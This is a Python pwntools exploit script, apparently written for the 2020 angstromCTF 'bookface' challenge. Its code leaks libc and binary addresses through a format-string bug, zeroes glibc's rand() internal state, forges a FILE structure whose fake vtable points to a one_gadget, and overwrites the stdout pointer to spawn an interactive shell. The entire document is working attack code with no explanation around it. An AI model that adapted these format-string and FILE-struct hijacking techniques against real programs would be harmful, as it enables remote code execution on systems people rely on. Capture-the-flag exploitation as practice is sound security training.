from pwn import *
from pwnlib.filepointer import *
import sys
import os

def survey(leak=False):
	if leak:
		fmt = '%17$p %15$p'.ljust(12, 'X')
		chunks = [fmt[i*3:i*3 + 3] for i in range(len(fmt)/3)]
		t.recvuntil('rate us from 1-10')
		t.sendafter('Content:', chunks[0])
		t.sendafter('Moderation:', chunks[1])
		t.sendafter('Interface:', chunks[2])
		t.sendafter('Support:', chunks[3])
		t.recvuntil("Those ratings don't seem quite right")
		t.recvuntil('again:\n')
		leak = t.recvuntil('X', drop=True).split(' ')
		leak = map(lambda x: int(x, 16), leak)
		t.sendafter('Content:','10\n')
		t.sendafter('Moderation:', '10\n')
		t.sendafter('Interface:', '10\n')
		t.sendafter('Support:', '10\n')
		return leak
	else:
		t.recvuntil('rate us from 1-10')
		t.sendafter('Content:', 'XXX')
		t.sendafter('Moderation:', 'XXX')
		t.sendafter('Interface:', 'XXX')
		t.sendafter('Support:', 'XXX')
		t.recvuntil("Those ratings don't seem quite right")
		t.sendafter('Content:','1\n')
		t.sendafter('Moderation:', '1\n')
		t.sendafter('Interface:', '1\n')
		t.sendafter('Support:', '1\n')
		return

def make_friends(n):
	t.sendlineafter('>', '1')
	t.sendlineafter('make?', str(n/8))

def logout():
	t.sendlineafter('>', '4')

def login(uid, new=False, name='', leak=False):
	t.sendlineafter('ID:', str(uid))
	if new:
		t.sendlineafter('name?', name)
	else:
		leak = survey(leak)
	return leak


def write(addr, name=''):
	global last_uid
	log.info('Zeroing {}'.format(hex(addr)))
	logout()
	last_uid += 1
	login(last_uid, new=True, name=name)
	make_friends(addr)
	logout()
	login(last_uid)

def exploit():
	global last_uid
	last_uid = random.randrange(1000000000, 4000000000)

	for f in os.listdir('./users'):
		os.unlink('./users/' + f)

	# ================================
	# Leak libc and binary pointers
	# ================================
	login(last_uid, new=True)
	logout()
	leak = login(last_uid, leak=True)
	libc = leak[0] - 0x6d363
	bin = leak[1] - 0x11b0
	randtbl = libc + 0x3c40a0
	log.info('libc: {}'.format(hex(libc)))
	log.info('bin_base: {}'.format(hex(bin)))
	log.info('randtbl: {}'.format(hex(randtbl)))

	# ================================
	# Overwrite the internal state of
	# rand() to make it return 0
	# ================================
	fake_tbl = bin + 0x4a00
	unsafe_state = libc + 0x3c4620
	log.info('Zeroing random state')
	# Overwrite end_ptr, to freeze fptr in place
	write(unsafe_state + 0x28)

	for i in range(1, 24):
		write(randtbl + 8*i)

	log.info('Final two')
	write(randtbl + 0)
	write(randtbl + 8)
	logout()
	# rand() will now return 0

	# =================================
	# Create fake FILE struct as stdout
        # at address 0 and invoke our fake
        # vtable
	# =================================
	og = libc + 0x4526a
	log.info('one_gadget: {}'.format(hex(og)))

	fake_file = FileStructure(null=fake_tbl)
	fake_file.flags = 'sh\0\0'
	fake_file.vtable = 0 # same address as this struct, but should be fine
	fake_file._IO_read_ptr = bin + 0x4a40 # make read_ptr larger than read_base
	fake_file._IO_read_end = bin + 0x4a30
	fake_file._IO_read_base = bin + 0x4a00
	fake_file._IO_buf_base = og # this is the "vtable" entry we call
	fake_file = str(fake_file)
	login(last_uid + 999, new=True)


	log.info('Overwriting stdout')
	log.info('Spawning shell...')
	# Overwrite stdout pointer to point to our fake FILE struct
	write(bin+e.symbols['stdout'], fake_file)

	t.interactive()

if __name__=='__main__':
	if len(sys.argv) > 1:
		t = remote('pwn.2020.chall.actf.co', 20733)
	else:
		t = process('./bookface')
		pause()
	e = ELF('./bookface')
	context.arch = 'amd64'
	exploit()
